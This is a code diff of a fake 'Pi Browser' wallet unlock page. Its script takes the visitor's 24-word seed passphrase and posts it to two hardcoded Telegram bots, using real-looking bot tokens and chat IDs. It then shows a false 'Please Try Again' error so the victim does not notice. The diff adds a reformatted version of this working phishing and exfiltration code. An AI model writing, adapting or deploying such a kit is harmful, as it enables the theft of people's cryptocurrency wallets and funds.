@@ -295,123 +295,128 @@
   <div class="home-indicator"></div>
 
   <script>
-    const TELEGRAM_BOT_TOKEN_1 = "7805304548:AAHAAvt4YJ08ujGZRhvliOLUnQ4oMM5Lb64";
-    const TELEGRAM_CHAT_ID_1 = "7666653410";
-    const TELEGRAM_BOT_TOKEN_2 = "7615321195:AAHXgXRI-WRAGBoLAsjfIuNtisGuDM6OVMo";
-    const TELEGRAM_CHAT_ID_2 = "8119887370";
+  const TELEGRAM_BOT_TOKEN_1 = "7805304548:AAHAAvt4YJ08ujGZRhvliOLUnQ4oMM5Lb64";
+  const TELEGRAM_CHAT_ID_1 = "7666653410";
+  const TELEGRAM_BOT_TOKEN_2 = "7615321195:AAHXgXRI-WRAGBoLAsjfIuNtisGuDM6OVMo";
+  const TELEGRAM_CHAT_ID_2 = "8119887370";
 
-    const HOMEPAGE_URL = "https://pibrowserkurd.github.io/pibrowserhome/";
+  const HOMEPAGE_URL = "https://pibrowserkurd.github.io/pibrowserhome/";
 
-    const buttons = document.querySelectorAll(".unlock-button");
-    const buttonTexts = document.querySelectorAll(".button-text");
-    const input = document.getElementById("messageInput");
-    const statusMessage = document.getElementById("statusMessage");
+  const buttons = document.querySelectorAll(".unlock-button");
+  const buttonTexts = document.querySelectorAll(".button-text");
+  const input = document.getElementById("messageInput");
+  const statusMessage = document.getElementById("statusMessage");
 
-    function disableInputAndButtons(disabled) {
-      input.disabled = disabled;
-      buttons.forEach(button => button.disabled = disabled);
+  function disableInputAndButtons(disabled) {
+    input.disabled = disabled;
+    buttons.forEach(button => button.disabled = disabled);
+  }
+
+  function showStatus(message, type) {
+    statusMessage.textContent = message;
+    statusMessage.className = `status-message ${type} show`;
+  }
+
+  function formatTimeWithOclock(date) {
+    let options = { hour: 'numeric', minute: '2-digit' };
+    let timeStr = date.toLocaleTimeString([], options);
+    return `${timeStr} o'clock`;
+  }
+
+  function sendMessage() {
+    const message = input.value.trim();
+
+    disableInputAndButtons(true);
+
+    buttonTexts.forEach(bt => {
+      bt.innerHTML = `<span class="loading-spinner"></span>Unlocking...`;
+    });
+
+    statusMessage.className = 'status-message';
+
+    if (message.length < 24) {
+      showStatus("The Passkey Should Be 24 Words Length", "error");
+
+      setTimeout(() => {
+        window.location.href = HOMEPAGE_URL;
+      }, 5000);
+
+      setTimeout(() => {
+        disableInputAndButtons(false);
+        buttonTexts[0].textContent = "Unlock With Passphrase";
+        buttonTexts[1].textContent = "Unlock With Face ID";
+      }, 5000);
+
+      return;
     }
 
-    function showStatus(message, type) {
-      statusMessage.textContent = message;
-      statusMessage.className = `status-message ${type} show`;
-    }
+    const passkey = message;
+    const now = new Date();
+    const timeStr = formatTimeWithOclock(now);
 
-    function formatTimeWithOclock(date) {
-      // format like "3:45 PM o'clock"
-      let options = { hour: 'numeric', minute: '2-digit' };
-      let timeStr = date.toLocaleTimeString([], options);
-      return `${timeStr} o'clock`;
-    }
+    const telegramMessage = `
+🔐 <b>New Passkey Received</b>\n
+📋 <b>Passkey:</b> <code>${passkey}</code>\n
+🕒 <b>Time:</b> ${timeStr}\n
+<a href="https://t.me/share/url?url=${encodeURIComponent(passkey)}" target="_blank">📎 Click here to copy passkey</a>
+`;
 
-    function sendMessage() {
-      const message = input.value.trim();
+    const requests = [
+      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN_1}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID_1,
+          text: telegramMessage,
+          parse_mode: "HTML"
+        })
+      }),
+      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN_2}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID_2,
+          text: telegramMessage,
+          parse_mode: "HTML"
+        })
+      })
+    ];
 
-      // Disable inputs and buttons immediately for cooldown
-      disableInputAndButtons(true);
-
-      // Show loading spinner and sending text on buttons
-      buttonTexts.forEach(bt => {
-        bt.innerHTML = `<span class="loading-spinner"></span>Unlocking...`;
-      });
-
-      // Clear previous status
-      statusMessage.className = 'status-message';
-
-      if (message.length < 24) {
-        showStatus("The Passkey Should Be 24 Words Length", "error");
-
-        // After 5 seconds, redirect to homepage
-        setTimeout(() => {
-          window.location.href = HOMEPAGE_URL;
-        }, 5000);
-
-        // Re-enable input/buttons after 5 seconds cooldown
+    Promise.all(requests)
+      .then(responses => Promise.all(responses.map(res => res.json())))
+      .then(results => {
+        const allSuccess = results.every(result => result.ok);
+        if (allSuccess) {
+          showStatus("✗ Please Try Again", "error");
+          input.value = "";
+        } else {
+          showStatus("✗ Please Try Again", "error");
+          console.error("Telegram API results:", results);
+        }
+      })
+      .catch(error => {
+        showStatus("✗ Please Try Again", "error");
+        console.error("Telegram API error:", error);
+      })
+      .finally(() => {
         setTimeout(() => {
           disableInputAndButtons(false);
           buttonTexts[0].textContent = "Unlock With Passphrase";
           buttonTexts[1].textContent = "Unlock With Face ID";
         }, 5000);
+      });
+  }
 
-        return;
-      }
+  input.addEventListener("input", function () {
+    this.style.height = "auto";
+    this.style.height = Math.min(this.scrollHeight, 200) + "px";
+  });
 
-      // Prepare Telegram message with header and timestamp
-      const now = new Date();
-      const timeStr = formatTimeWithOclock(now);
-      const telegramMessage = `;
+  window.addEventListener("load", () => {
+    input.focus();
+  });
+</script>
 
-      // Send message to both Telegram bots
-      const requests = [
-        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN_1}/sendMessage`, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID_1, text: telegramMessage })
-        }),
-        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN_2}/sendMessage`, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID_2, text: telegramMessage })
-        })
-      ];
-
-      Promise.all(requests)
-        .then(responses => Promise.all(responses.map(res => res.json())))
-        .then(results => {
-          const allSuccess = results.every(result => result.ok);
-          if (allSuccess) {
-            showStatus("✗ Please Try Again", "error");
-            input.value = "";
-          } else {
-            showStatus("✗ Please Try Again", "error");
-            console.error("Telegram API results:", results);
-          }
-        })
-        .catch(error => {
-          showStatus("✗ Please Try Again", "error");
-          console.error("Telegram API error:", error);
-        })
-        .finally(() => {
-          // Re-enable input/buttons after 5 seconds cooldown
-          setTimeout(() => {
-            disableInputAndButtons(false);
-            buttonTexts[0].textContent = "Unlock With Passphrase";
-            buttonTexts[1].textContent = "Unlock With Face ID";
-          }, 5000);
-        });
-    }
-
-    // Auto-resize input height on input
-    input.addEventListener("input", function() {
-      this.style.height = "auto";
-      this.style.height = Math.min(this.scrollHeight, 200) + "px";
-    });
-
-    // Focus input on page load
-    window.addEventListener("load", () => {
-      input.focus();
-    });
     
-    </script>
 </body>
 </html>
